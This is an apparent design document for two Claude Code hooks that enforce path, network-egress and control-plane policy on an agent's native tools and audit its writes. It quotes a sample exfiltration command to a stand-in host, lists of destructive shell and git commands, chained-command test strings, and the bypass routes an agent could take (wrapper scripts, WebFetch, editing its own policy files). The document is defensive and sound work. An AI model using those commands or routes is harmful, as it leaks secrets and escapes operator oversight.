# Native Tool Hooks

> Relates to: [OVERVIEW.md §1 — the agent could read or touch something it shouldn't](../OVERVIEW.md#1-the-agent-could-read-or-touch-something-it-shouldnt)

**Source:** [`claudenv/adapters/policy_hook.py`](../../claudenv/adapters/policy_hook.py),
[`claudenv/adapters/audit_hook.py`](../../claudenv/adapters/audit_hook.py).
**Installer:** [`claudenv/adapters/hooks/installer.py`](../../claudenv/adapters/hooks/installer.py).
**Tests:** [`tests/test_policy_hook_bash.py`](../../tests/test_policy_hook_bash.py),
[`tests/test_install_hooks.py`](../../tests/test_install_hooks.py).

This doc covers the two Claude Code hooks and nothing else. The actual path
allow/deny decision — globs, extensions, regex, tiers — is
[`claudenv/domain/policy/policy_engine.py`](../../claudenv/domain/policy/policy_engine.py), fully documented in
[`policy-engine.md`](policy-engine.md); this doc only explains how these hooks *call*
that engine, how they extract a path out of a free-form Bash command string in the
first place, and the hook-specific guards (control plane, MCP-first) and failure
posture layered on top.

---

## What it does (30-second version)

The MCP `filesystem-policy` server only governs traffic that goes through MCP tools.
Claude Code's **native** tools — `Read`, `Write`, `Edit`, `NotebookEdit`, `Glob`,
`Grep`, `Bash`, `WebFetch`, `WebSearch` — never touch an MCP server, so without these
hooks an agent could bypass the entire policy layer just by using the built-in tools
instead. Two hooks close that gap:

- **`policy_hook.py`** runs on `PreToolUse` for every one of those tools. It extracts
  whatever path (or, for `Bash`, command string) the call touches, runs it through the
  same `PolicyEngine`, and can `deny` or `ask` before the tool executes. It also
  gates the native network tools (`WebFetch`/`WebSearch`) under the same egress rule
  as Bash `curl`, and **confines reads to the onboarded repo** — a path resolving
  outside the repo (a sibling repo, `~/.claude/*`) is hard-denied. Every denial
  carries an operator-control signature so a model doesn't mistake it for injected
  text and try to route around it.
- **`audit_hook.py`** runs on `PostToolUse` for the mutating subset (`Write`, `Edit`,
  `NotebookEdit`, `Bash`) and writes a `native.<Tool>` row to the audit ledger. It never
  blocks anything — `PostToolUse` fires after the tool already ran.

Both are wired into the **repo-local**, git-committed `<repo>/.claude/settings.json`
by `claudenv/adapters/hooks/installer.py` — so governance is scoped to onboarded repos only, and an
un-onboarded repo on the same machine is left untouched. `claude-env onboard` installs
them automatically; `claude-env hooks` (run inside a repo) re-installs or repairs them.
They are invoked as
`"$CLAUDE_ENV_HOME/venv/bin/python" "$CLAUDE_ENV_HOME/{policy_hook,audit_hook}.py"`
with the tool call's JSON piped in on stdin. The command uses the literal
`$CLAUDE_ENV_HOME` env var (shell-expanded per machine) rather than baked-in absolute
paths, so the committed `settings.json` is portable across a team — any developer with
claude-env bootstrapped runs the right hook. The old machine-wide install
(`~/.claude/settings.json`) is still available behind `claude-env hooks --global`.

---

## Configuration reference

Neither hook reads a YAML config file — the "configuration surface" here is
environment variables read at import/run time, plus the wiring the installer writes.

| Name | Type | Default | Effect |
|---|---|---|---|
| `CLAUDE_ENV_HOME` | path | `~/.claude-env` | Where hooks add both themselves and the repo checkout to `sys.path`, and where `INCIDENT_MARKER` (`state/INCIDENT`) is looked up (`policy_hook.py,61`; `claudenv/adapters/audit_hook.py`). |
| `CLAUDE_ENV_HOOK_FAIL_CLOSED` | bool-ish string | unset (`false`) | If `"true"` (case-insensitive), an internal error in `policy_hook.py`'s `main()` denies the call instead of allowing it (`claudenv/adapters/policy_hook.py`, `546-550`). Recommended for tier-2+ machines per the module docstring. |
| `CLAUDE_ENV_MCP_FIRST` | bool-ish string | unset (`true`) | If `"false"`, disables the MCP-first redirect entirely — `_mcp_first_hint()` returns `None` unconditionally (`claudenv/adapters/policy_hook.py`). |
| `CLAUDE_ENV_HOOK_AUDIT_ALL` | bool-ish string | unset (`false`) | If `"true"`, `audit_hook.py` writes a row for **every** intercepted tool, not just the mutating set (`audit_hook.py,36`). |

| Installer constant / flag | Value | Effect |
|---|---|---|
| `PRE_MATCHER` (`claudenv/adapters/hooks/installer.py`) | `"Read\|Write\|Edit\|NotebookEdit\|Glob\|Grep\|Bash\|WebFetch\|WebSearch"` | Which tools trigger `policy_hook.py` on `PreToolUse`. `WebFetch`/`WebSearch` were added (2026-07-09) so the network-egress rule covers the **native** web tools, not just Bash `curl`/`wget` — otherwise a model whose shell egress is denied could reach the network by switching to `WebFetch`. If you widen the tools the hook must govern, widen this matcher too, or Claude Code never routes the new tool to the hook. |
| `POST_MATCHER` (`claudenv/adapters/hooks/installer.py`) | `"Write\|Edit\|NotebookEdit\|Bash"` | Which tools trigger `audit_hook.py` on `PostToolUse`. Note `Read`/`Glob`/`Grep` are **not** in this matcher at all — `audit_hook.py`'s own `_MUTATING` filter is a second, redundant layer of the same restriction. |
| `PRE_CMD` / `POST_CMD` | `"$CLAUDE_ENV_HOME/venv/bin/python" "$CLAUDE_ENV_HOME/{policy,audit}_hook.py"` | The portable hook command written into `settings.json`. Uses the literal env var (shell-expanded per machine) so the committed file works on any bootstrapped teammate. |
| `--repo <path>` (default: cwd) | resolves to `<path>/.claude/settings.json` | The default target — repo-local governance. |
| `--global` | `~/.claude/settings.json` | Machine-wide install (legacy behavior; opt-in). |
| `--settings <path>` | explicit file | Overrides `--repo`/`--global`. |

All boolean-ish env vars use the same idiom: `os.environ.get(NAME, default).lower() ==
"true"` — any other value (`"1"`, `"yes"`, unset-with-no-default-string) is falsy.

---

## How to use it

```bash
# Preview the resulting settings.json without writing anything
claude-env hooks --dry-run

# Install the policy + audit hooks into THIS repo's .claude/settings.json (default)
claude-env hooks

# Onboarding does this for you automatically:
claude-env onboard .

# Target a specific repo, or an explicit settings file
claude-env hooks --repo /path/to/repo
claude-env hooks --settings ./.claude/settings.json

# Machine-wide install (the old behavior; not the default)
claude-env hooks --global

# Remove them again (mirrors whichever target is in effect; also strips
# leftover legacy absolute-path installs)
claude-env hooks --uninstall
claude-env hooks --uninstall --global
```

Running `--dry-run` before the real install is worth doing every time — it prints the
exact `hooks` block that would be merged into the target file, so you can confirm the
matchers and command paths before anything on disk changes. Whichever of `hooks`,
`--uninstall`, or a `--settings`-targeted install you run, **Claude Code must be
restarted afterward** for the change to take effect, per this repo's own deploy
workflow.

---

## How the logic works

### `PreToolUse`: extracting a path from the tool call

`main()` pulls the target path out of whichever key the tool actually uses, then falls
back to Bash's `command` string:

```python
# claudenv/adapters/policy_hook.py
path_str = next((tin[k] for k in _PATH_KEYS if tin.get(k)), None)
if not path_str and tool == "Grep":
    path_str = tin.get("path")
is_bash = tool == "Bash"
bash_cmd = tin.get("command", "") if is_bash else ""
if not path_str and not is_bash and tool not in ("Write", "Edit", "NotebookEdit"):
    return 0  # pathless, non-Bash calls: no path policy to apply
```

`_PATH_KEYS = ("file_path", "path", "notebook_path")` (`claudenv/adapters/policy_hook.py`) covers
`Read`/`Write`/`Edit` (`file_path`), `Glob` (`path`), and `NotebookEdit`
(`notebook_path`). `Grep`'s `path` is fetched separately because `Grep`'s primary key is
`pattern`, not a path key that would satisfy the first check. A `Write`/`Edit`/
`NotebookEdit` call with no path at all still falls through (for the secret-content
scan later), everything else with no path and no Bash command exits immediately —
that's why a bare `Glob` with only a `pattern` key and no `path` key is never
policy-checked at all.

### Bash: tokenizing around the `shlex.split()` gap

Native `Bash` has no path key — the entire command is one string — so the hook has to
parse it. The module docstring calls this the "Bash gap"
(`claudenv/adapters/policy_hook.py`). The first subtlety is that plain `shlex.split()` glues
operators onto adjacent words:

```python
# claudenv/adapters/policy_hook.py
def _shell_tokens(command: str) -> list[str]:
    """Tokenize a shell command, respecting quotes AND surfacing operators
    (`;` `|` `&` `&&` `||` `<` `>` `>>`) as their own tokens.

    `shlex.split()` does NOT split operators glued to a word, so `echo hi;rm x`
    tokenizes as `['echo', 'hi;rm', 'x']` — the `rm` is never seen as a command
    and the destructive/segment/redirect checks below are silently bypassed.
    A shlex.shlex with punctuation_chars fixes that while still honoring quotes
    (so `echo "a;b"` keeps `a;b` intact)."""
    try:
        lex = shlex.shlex(command, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        lex.commenters = ""            # '#' is not a comment mid-command
        return list(lex)
    except ValueError:
        return [t for t in re.split(r"\s+", command) if t]
```

This was a real, fixed bypass: `tests/test_policy_hook_bash.py`
(`test_shlex_bypass_chained_destructive_still_denied`) asserts `"echo hi;rm -rf
build"`, `"true && rm src/app.py"`, `"ls | rm x"`, and `"(rm -rf build)"` are all
denied, while a semicolon **inside a quoted string** (`echo "a;rm b"`) is correctly
left alone and allowed. `lex.commenters = ""` matters too: without it, `#` mid-command
would be treated as a shell comment and everything after it silently dropped from
tokenization.

Tokens are then split into simple-command segments on `_CMD_SEP = {";", "|", "&",
"&&", "||", "|&", "\n", "(", ")", "{", "}"}` (`claudenv/adapters/policy_hook.py`) so each
segment's leading token can be checked as its own command — this is what lets `(rm -rf
build)` be caught even though `rm` is hidden behind a `(`.

### `_bash_candidates()` — conservative path/network extraction

```python
# claudenv/adapters/policy_hook.py
def _bash_candidates(command: str, cwd: str) -> tuple[list[str], set[str]]:
    """Parse a Bash command into (candidate file paths, network-egress cmds).

    Conservative on purpose: a slashless bare token is only a candidate path
    when it is an argument to a file command AND exists on disk, so arbitrary
    args (grep patterns, subcommands like `git log`) are not mistaken for files
    under tier-3 default-deny.
    """
```

The key design choice is in the loop body: a token is a path candidate if it
*structurally* looks like one (`_looks_like_path`: contains `/`, or starts with `~` or
`.`), **or** — only for a token that doesn't look like a path — if the leading command
is in `_FILE_CMDS` *and* `(base / tok).exists()` on disk. That second branch is why
`grep -r pattern src/` doesn't treat `pattern` as a file
(`test_candidates_ignore_flags_and_bare_nonexistent`, `tests/test_policy_hook_bash.py`):
`pattern` has no slash and doesn't exist as a file relative to `cwd`. URLs are
explicitly excluded via `re.match(r"^[a-z][a-z0-9+.\-]*://", tok)` before the path
checks run, so `curl https://example.com` extracts zero paths, only the network
command (`test_candidates_urls_are_not_paths`, `tests/test_policy_hook_bash.py`).
Redirection targets are captured two ways — a separate `>`/`>>`/`<` token followed by
its target, or the operator glued directly to the filename (`>file`, `2>>file`) via
`re.match(r"^(?:\d*>>?|<)(.+)$", tok)`.

### `_bash_write_targets()` — narrower, for the control-plane guard

A second, stricter extractor exists specifically so the control-plane guard doesn't
fire on reads:

```python
# claudenv/adapters/policy_hook.py
def _bash_write_targets(command: str, cwd: str) -> list[str]:
    """File paths a Bash command WRITES to: redirection destinations (`>`/`>>`,
    glued or spaced) plus the target args of file-writing commands. Read-only
    args (cat/grep/sed -n/…) are deliberately excluded."""
```

It reuses the same tokenizer and segmenter, but only collects redirection
destinations plus the target arguments of `_WRITE_CMDS = {"cp", "mv", "tee", "dd",
"install", "ln", "rsync"}` (`claudenv/adapters/policy_hook.py`). For `cp`/`mv`/`install`/`ln`/
`rsync` only the **last** non-flag argument counts (the destination); `tee` writes
**all** of its file args; `dd` is handled separately by pulling `of=<file>` out of its
`key=value` argument style (`claudenv/adapters/policy_hook.py`). This is why `cat
.claude/repo-policy.yaml` is allowed while `cp x .claude/repo-policy.yaml` is denied —
`cat` isn't in `_WRITE_CMDS` and isn't a redirection, so it never appears in this
extractor's output at all, confirmed by `test_control_plane_read_is_allowed`
(`tests/test_policy_hook_bash.py`).

### `_mutating_reason()` — the hard-deny list, independent of path

```python
# claudenv/adapters/policy_hook.py
def _mutating_reason(command: str) -> str | None:
    """Return a reason if the command is a destructive/state-mutating native shell
    command that must be hard-denied, else None."""
    ...
    for s in seg:
        if not s:
            continue
        cmd = os.path.basename(s[0])
        if cmd in _MUTATING_CMDS:
            return f"state-mutating command '{cmd}'"
        if cmd == "git":
            subs = [t for t in s[1:] if not t.startswith("-")]
            if subs and subs[0] in _GIT_MUTATING:
                return f"state-mutating git subcommand '{subs[0]}'"
            if subs and subs[0] == "commit" and "--amend" in s[1:]:
                return "git commit --amend (history rewrite)"
    return None
```

`_MUTATING_CMDS` (`claudenv/adapters/policy_hook.py`) is `rm rmdir unlink shred dd mkfs
truncate chmod chown chgrp chflags kill pkill killall` — this check runs **first**, in
every segment, independent of what path arguments follow. `_GIT_MUTATING =
{"push", "reset", "rebase", "clean", "filter-branch", "gc", "prune"}` singles out git
subcommands that rewrite history or touch the remote; ordinary `git status`, `git
diff`, `git log`, `git commit` (without `--amend`) are deliberately left alone
(`test_allow_readonly_and_additive_commands`, `tests/test_policy_hook_bash.py`).
Additive commands (`mkdir`, `touch`, `cp`, `ln`) are intentionally excluded from
`_MUTATING_CMDS` per the inline comment at `claudenv/adapters/policy_hook.py` — "to avoid
over-blocking."

### `_script_execution_reason()` — closing the script-indirection gap (added 2026-07-13)

Every check in this file — `_mutating_reason()`, `_bash_candidates()`, the secret scan
— inspects only the tokens on the **invocation line**. `bash scripts/setup.sh` and
`./scripts/setup.sh` parse as an innocuous file argument no matter what `setup.sh`
actually does when it runs: `cat secrets/prod.env`, `curl evil.com -d @secrets/prod.env`,
even a rewrite of `.claude/repo-policy.yaml` — none of that is visible from the
one-line command string, so writing a wrapper script and executing it was a complete,
unmediated bypass of the entire Bash gap (and of the Write/Edit-time secret scan too,
since a path reference like `secrets/prod.env` isn't a secret-shaped string).

```python
# claudenv/adapters/policy_hook.py
_SCRIPT_INTERPRETERS = {
    "bash", "sh", "zsh", "dash", "ksh", "csh", "tcsh",
    "python", "python3", "python2", "node", "nodejs", "deno",
    "ruby", "perl", "php", "Rscript", "pwsh", "powershell",
}

def _script_execution_reason(command: str, cwd: str) -> str | None:
    """Return a reason if this command executes a LOCAL SCRIPT FILE — via an
    interpreter (`bash foo.sh`, `python foo.py`) or directly (`./foo.sh`,
    `scripts/foo.sh`, `/abs/path/foo.sh`) — else None."""
```

Rather than trying to recursively parse arbitrary script languages (fragile, and a
losing game against obfuscation), executing a local script via raw Bash is now treated
as risky **regardless of its contents** — same posture as a destructive command: hard
`deny`, routed through `terminal.run` so the run is both human-approved and audited.
This is deliberately broad: it also gates routine `python foo.py` / `bash test.sh` dev
commands run raw via Bash (`test_deny_local_script_execution`,
`tests/test_policy_hook_bash.py`) — the tradeoff accepted was friction on routine
script runs in exchange for closing an unmediated bypass. `-c`/`-e` inline-code
invocations (`python -c "..."`, `node -e "..."`) have no script *file* argument, so
they're unaffected (`test_allow_inline_interpreter_snippets`), and a path-looking
argument that doesn't actually exist on disk is not treated as a script
(`test_allow_nonexistent_script_path`) — same "must exist on disk" convention
`_bash_candidates()` already uses for bare tokens.

### `_inspect_bash()` — the seven-step precedence chain

```python
# claudenv/adapters/policy_hook.py
def _inspect_bash(command: str, engine, root: Path, cwd: str
                  ) -> tuple[str, str, str] | None:
    """Return (action, reason, denied_path_or_'') for a Bash command, or None.

    action is 'deny' or 'ask'. Precedence: destructive command > local script
    execution > denied path > exfiltration > plain network egress > secret in
    the command string.
    """
```

The docstring's stated order actually has one more step than listed: the
control-plane write check sits between the script-execution check and the
denied-path check in the real code (`claudenv/adapters/policy_hook.py`), even though the
docstring's one-line summary omits it. In full:

1. **`_mutating_reason()` match** → hard `deny`, no path involved at all.
2. **`_script_execution_reason()` match** → hard `deny`, regardless of the script's
   contents (see above).
3. **Control-plane write target** (via `_bash_write_targets()` + `_is_control_plane()`)
   → hard `deny`, unless the resolved path matches the repo's `override_deny`.
4. **Any `_bash_candidates()` path that `PolicyEngine.evaluate_path()` blocks** → `deny`
   (this is the only step that calls into `policy-engine.md`'s logic).
5. **A network command (`_NET_CMDS`) together with any file path** → `deny` as likely
   exfiltration.
6. **A network command alone** → `deny` on tier ≥ 2 (network disabled at that tier),
   `ask` on tier ≤ 1.
7. **A secret pattern found in the raw command string** (via
   `security.detectors.SECRET_PATTERNS`) → `ask`.

If none of the seven match, `_inspect_bash()` returns `None` and the command is
allowed silently.

> The diagram below predates the script-execution step (2) and still shows the
> six-step chain — treat it as illustrative of the overall shape, not the current
> step count, until it's regenerated.

![Bash decision precedence](../assets/guide/native-tool-hooks/bash-precedence.svg)

### The control-plane guard (`_is_control_plane`)

```python
# claudenv/adapters/policy_hook.py
_CONTROL_PLANE = [
    # per-repo control plane (relative form, e.g. ".claude/repo-policy.yaml")
    re.compile(r"(^|/)\.claude/repo-policy\.ya?ml$"),
    re.compile(r"(^|/)\.claude/settings(\.local)?\.json$"),
    # the deployed platform itself ($CLAUDE_ENV_HOME): config, hooks, policy code
    re.compile(r"(^|/)\.claude-env/(config|hooks|security|agents|sql|lib)/"),
    re.compile(r"(^|/)\.claude-env/config/.*\.(ya?ml|json)$"),
]


def _is_control_plane(*path_forms: str) -> bool:
    """True if any given path form (repo-relative and/or absolute) names a
    claude-env control-plane file. Checking multiple forms closes the gap where
    a repo-relative path wouldn't reveal a $CLAUDE_ENV_HOME target."""
    for p in path_forms:
        if not p:
            continue
        norm = p.replace("\\", "/")
        for rx in _CONTROL_PLANE:
            if rx.search(norm):
                return True
    return False
```

This exists so an agent can't weaken its own guardrails by editing the files that
*define* them — `.claude/repo-policy.yaml`, `.claude/settings.json` /
`settings.local.json`, or anything under the deployed `$CLAUDE_ENV_HOME`'s
`claudenv/_data/config/` directories. It is checked in two independent
call sites that both must agree: the Bash write-target loop
(`claudenv/adapters/policy_hook.py`) and the native `Write`/`Edit`/`NotebookEdit` path in
`main()` (`claudenv/adapters/policy_hook.py`). Both call sites pass **both** the
repo-relative and the resolved-absolute form of the path — the docstring explains why:
a purely repo-relative check would miss a write aimed at
`~/.claude-env/policy_hook.py` from inside an unrelated repo. Both sites also
check `not engine._match_paths(rel, engine.repo.override_paths)` — reaching into the
`PolicyEngine`'s private `_match_paths` method and its `override_paths` — so a repo
can still explicitly opt a control-plane path back in in its own
`.claude/repo-policy.yaml` under `override_deny`, the same escape hatch documented in
`policy-engine.md`.

This is a genuinely separate guard from `evaluate_path()`'s own deny logic: the global
self-protection deny list in `global-policy.yaml` (documented in `policy-engine.md`)
covers a similar but not identical set of files by glob, evaluated as part of the
normal path-check pipeline. `_is_control_plane()` is a second, hook-level regex check
that runs *before* `evaluate_path()` is even called for native writes, and is the only
mechanism that inspects Bash's write targets at all — `evaluate_path()` never sees a
Bash command string, only whatever path the hook decides to feed it.

### MCP-first redirect

```python
# claudenv/adapters/policy_hook.py
_MCP_FIRST = [
    (re.compile(r"(^|/)\.claude/.*/memory/"),
     "record or recall memory via the memory-graph MCP (memory.write / memory.recall) — "
     "do not edit Claude Code's memory files directly"),
]
```

A native `Write`/`Edit`/`NotebookEdit` targeting a path matching this list is denied
with a hint pointing at the governed MCP tool instead — so an agent can't sidestep the
memory-graph MCP's own logic (dedup, node-kind validation, hash-chained writes) by
editing Claude Code's memory files directly. It only fires in onboarded repos (checked
via `(root / ".claude" / "repo-policy.yaml").exists()` at the call site,
`claudenv/adapters/policy_hook.py`) and can be switched off wholesale with
`CLAUDE_ENV_MCP_FIRST=false`. `tests/test_policy_hook_bash.py`
(`test_mcp_first_memory_redirect`) confirms both
`Users/x/.claude/projects/y/memory/MEMORY.md` and `.claude/projects/z/memory/note.md`
match, while ordinary source (`src/app.py`) and an unrelated doc that merely mentions
memory in its filename (`docs/memory-design.md`) do not — the regex requires a literal
`memory/` **path segment**, not just the substring "memory" anywhere in the path.

### `main()` — the full PreToolUse sequence

Putting it together, in the order the real code checks them (`claudenv/adapters/policy_hook.py`):

1. Parse stdin JSON; malformed input returns `0` immediately (nothing to decide on).
2. Incident marker check — hard deny everything if present.
3. **Network-tool gate (`WebFetch`/`WebSearch`, `_NET_TOOLS`)**: split by risk, per
   tier. `WebFetch` retrieves an arbitrary URL and can POST a body (a data-exfil
   vector like Bash `curl`) → `deny` at tier ≥ 2, `ask` at tier ≤ 1. `WebSearch`
   sends only a query string and cannot ship file contents out → allow (silent) at
   tier ≤ 1, and `ask` at tier ≥ 2 (controlled rather than hard-denied — a search
   still can't run unobserved on a sensitive repo, but it isn't impossible).
   Unlike the general fail-open posture, if the tier can't be resolved the gate
   **never silently allows**: it denies under `CLAUDE_ENV_HOOK_FAIL_CLOSED`, else
   asks — egress is a hard invariant. Returns before any path logic.

   | Tool | tier ≤ 1 | tier ≥ 2 |
   |---|---|---|
   | `WebFetch` | ask | deny |
   | `WebSearch` | allow | ask |
4. Extract `path_str` / `bash_cmd`; bail early (allow) if neither applies.
5. `PolicyEngine.load(root)` where `root` is found by walking up from `cwd` looking
   for `.claude/repo-policy.yaml` or `.git` (`_repo_root`, `claudenv/adapters/policy_hook.py`).
6. **Read confinement (`_out_of_repo_read`)**: for a native path tool, and for each
   file candidate a Bash command touches, a path that resolves **outside the
   onboarded repo root** is hard-denied (+ `policy_violation` row) — with only the
   session scratchpad (`claude-<uid>` subtree) exempted. This closes the gap where
   in-repo-only allow rules plus name-based global deny globs let reads reach sibling
   repos, `~/.claude/projects/*`, `~/.claude/settings.json`, etc. Only active in
   onboarded repos (those with a `repo-policy.yaml`), which define the scope.
7. If `Bash`: run `_inspect_bash()`; a `deny` also writes a `policy_violation` audit
   row before printing the JSON decision.
8. If a mutating native tool with a path: control-plane guard.
9. If any tool with a path: `PolicyEngine.evaluate_path()`; a block also writes a
   `policy_violation` row.
10. If a mutating native tool with a path, in an onboarded repo: MCP-first redirect.
11. If a mutating native tool: scan write content for secret patterns; a hit writes a
    `security_event` row (regardless of whether the operator later says yes) and
    returns `ask`.
12. Otherwise: allow, silently — no stdout at all.

Every `deny`/`ask` reason is prefixed with a stable operator-control **signature**
(`SIGNATURE`, `claudenv/adapters/policy_hook.py`) via `_deny`/`_ask` — so a model reading the
reason can tell it apart from prompt-injected text and stop rather than trying to
route around a control it mistook for session content.

All of steps 5-11 run inside one `try`/`except`; see [fail-open vs fail-closed](#facts-invariants--edge-cases)
below for what happens if any of them raises. (Step 3's net-tool gate has its own
never-silently-allow handling described above.)

![PreToolUse decision flow](../assets/guide/native-tool-hooks/pretooluse-flow.svg)

### `PostToolUse`: `audit_hook.py`

```python
# claudenv/adapters/audit_hook.py
def main() -> int:
    try:
        payload = json.load(sys.stdin)
        tool = payload.get("tool_name", "")
        if tool not in _MUTATING and not _AUDIT_ALL:
            return 0
        tin = payload.get("tool_input") or {}
        resp = payload.get("tool_response")
        cwd = payload.get("cwd", "")
        session = payload.get("session_id", "hook")

        summary = {}
        for k in ("file_path", "path", "notebook_path", "command", "pattern"):
            if tin.get(k):
                summary[k] = str(tin[k])[:_MAX_ARG]
        ok = True
        if isinstance(resp, dict) and (resp.get("is_error") or resp.get("error")):
            ok = False

        from audit.audit_logger import AuditLogger
        AuditLogger(session, actor="claude-code",
                    repo=_repo_slug(cwd)).tool_call(
            tool=f"native.{tool}", args=summary,
            result_kind="ok" if ok else "error")
    except Exception:
        pass  # auditing must never disturb the session
    return 0
```

`_repo_slug(cwd)` walks up from the session's `cwd` to the repo's
`.claude/repo-policy.yaml` and reads its `repo:` field — the same stable slug the
RAG table and memory namespace are keyed on — so audit rows key-match those
namespaces instead of a possibly-divergent directory basename. It falls back to
the directory name when no policy is found (e.g. an un-onboarded repo, though the
repo-local hook wiring means a governed session almost always has one).

This hook never emits a `hookSpecificOutput` block and never denies — `PostToolUse`
fires after the tool has already run, so there's nothing left to block. It writes one
`tool_call` audit row (via `AuditLogger.tool_call`,
`claudenv/adapters/audit.py`) per call, with `tool` set to `f"native.{tool}"` (e.g.
`native.Write`, `native.Bash`) so ledger queries can distinguish native tool traffic
from MCP traffic (which is logged as its own tool names by the MCP servers
themselves). `_MUTATING = {"Write", "Edit", "NotebookEdit", "Bash"}`
(`claudenv/adapters/audit_hook.py`) is the default filter; every arg value is truncated to
`_MAX_ARG = 400` characters before being stored, so a giant `content` write doesn't
bloat the ledger — only the five keys in the loop (`file_path`, `path`,
`notebook_path`, `command`, `pattern`) are captured, so a `Write`'s actual `content` is
**never** written to the audit row at all, only its target path.

---

## Facts, invariants & edge cases

- **The docstring's stated precedence is incomplete** — see the seven-step chain
  [above](#_inspect_bash--the-seven-step-precedence-chain); the control-plane write
  check between "local script execution" and "denied path" isn't in the docstring's
  one-line summary. Read the code, not just the docstring, if you need the exact order.
- **Executing a local script via raw Bash is always denied, independent of what the
  script contains** — see [`_script_execution_reason()`](#_script_execution_reason--closing-the-script-indirection-gap-added-2026-07-13).
  This is broader than the other checks in this file, which all key off something
  concrete in the invocation (a denied path, a network command, a secret pattern);
  this one keys off "is a local script file being executed at all," because the
  script's contents can't be inspected from the invocation line.
- **Reading the control plane is always fine; only writes are guarded.** `cat
  .claude/repo-policy.yaml` and `grep tier .claude/repo-policy.yaml` are both allowed
  (`test_control_plane_read_is_allowed`, `tests/test_policy_hook_bash.py`) —
  the guard only inspects `_bash_write_targets()`, which deliberately excludes
  read-only commands like `cat`/`grep`/`sed -n`.
- **A bare slashless token is a path candidate only if the file already exists on
  disk.** This is the mechanism that keeps `grep -r pattern src/` from treating
  `pattern` as a file under tier-3 default-deny — deliberately conservative, so it can
  also mean a real file that hasn't been created yet (e.g. a `touch newfile.txt`
  target) is *not* policy-checked, because `_looks_like_path("newfile.txt")` is false
  and the file doesn't exist yet either. `touch` isn't in `_FILE_CMDS` regardless, so
  this particular example is moot, but the general gap (nonexistent bare-token targets
  of a `_FILE_CMDS` command) exists by design.
- **The hard-deny list intentionally excludes additive commands** (`mkdir`, `touch`,
  `cp`, `ln`; see [`_mutating_reason()`](#_mutating_reason--the-hard-deny-list-independent-of-path)).
  `cp src/app.py src/copy.py` is allowed outright by
  `test_allow_readonly_and_additive_commands` (`tests/test_policy_hook_bash.py`),
  even though `cp` can overwrite an existing file — the destination is still subject
  to the policy-blocked-path check and the control-plane guard, just not the hard
  "state-mutating" deny.
- **The audit row for a Bash denial happens *before* the deny is printed, and failure
  to write it is swallowed.** `claudenv/adapters/policy_hook.py` wraps the
  `AuditLogger(...).policy_violation(...)` call in its own `try`/`except Exception:
  pass` — if the DB is unavailable, the deny still happens, it's just not logged. The
  same pattern repeats at every audit call site in this file
  (`claudenv/adapters/policy_hook.py`, `504-511`, `534-542`); the inline comment at
  `claudenv/adapters/policy_hook.py` states the intent directly: "auditing must never break the
  decision itself."
- **Fail-open is the default for the *entire* `main()` body, not just the engine
  load.** The `try` at `claudenv/adapters/policy_hook.py` wraps everything from
  `PolicyEngine.load()` through the secret-content scan — any exception anywhere in
  that block (a corrupt policy YAML, a broken DB connection, a bug in `_inspect_bash`)
  falls through to `except Exception as exc:`, which allows silently unless
  `CLAUDE_ENV_HOOK_FAIL_CLOSED=true`. A malformed stdin payload is handled even earlier
  and more permissively — `json.load(sys.stdin)` failing returns `0` before the
  `try` block is ever reached, i.e. before `FAIL_CLOSED` is even consulted.
- **The `PostToolUse` matcher and the hook's own `_MUTATING` set are redundant by
  design, not accidentally duplicated.** `install_hooks.py`'s `POST_MATCHER` already
  restricts invocation to `Write|Edit|NotebookEdit|Bash`
  (`claudenv/adapters/hooks/installer.py`), so `audit_hook.py`'s internal `_MUTATING` check
  (`audit_hook.py,36`) only actually does work when `CLAUDE_ENV_HOOK_AUDIT_ALL`
  broadens the *installed* matcher too — otherwise Claude Code itself never invokes the
  hook for a `Read`/`Glob`/`Grep` call in the first place. Setting the env var alone,
  without changing `POST_MATCHER`, does nothing.
- **`Write` content is never stored in the audit ledger, even truncated** — the
  `summary` loop only reads the five keys listed [above](#posttooluse-audit_hookpy);
  `content`/`new_string`/`new_source` (the keys `policy_hook.py`'s secret scan
  inspects) are absent (`claudenv/adapters/audit_hook.py`). The ledger records *that* a write
  happened and to *which* path, never the bytes written.
- **`_repo_root()` prefers an existing repo policy file over a bare `.git`.** Because
  the loop checks `(cand / ".claude" / "repo-policy.yaml").exists() or (cand /
  ".git").exists()` at each directory (`claudenv/adapters/policy_hook.py`) walking
  *upward*, the first ancestor satisfying *either* condition wins — a nested Bash
  subshell or `cd`-ed working directory below the true repo root will still resolve
  correctly as long as no intermediate directory happens to have its own `.git` or
  policy file first.

---

## Related docs

- [`policy-engine.md`](policy-engine.md) — `PolicyEngine.evaluate_path()`, the tier
  system, glob/extension/regex matching, and `override_deny`. This doc's Bash and
  control-plane logic are callers of that engine, not a reimplementation of it.
- [`secret-detection.md`](secret-detection.md) — the `SECRET_PATTERNS` this hook
  imports from `security.detectors` for both the inline-command scan and the
  Write/Edit content scan.
- [`incident-mode.md`](incident-mode.md) — the `state/INCIDENT` marker file both
  `policy_hook.py` and `PolicyEngine.evaluate_path()` check independently.
- [`audit-ledger.md`](audit-ledger.md) — `AuditLogger`, the hash-chained ledger both
  hooks write into (`tool_call`, `policy_violation`, `security_event`).
- [OVERVIEW.md §1](../OVERVIEW.md#1-the-agent-could-read-or-touch-something-it-shouldnt) —
  the product-level framing of the problem these hooks close for native tools.
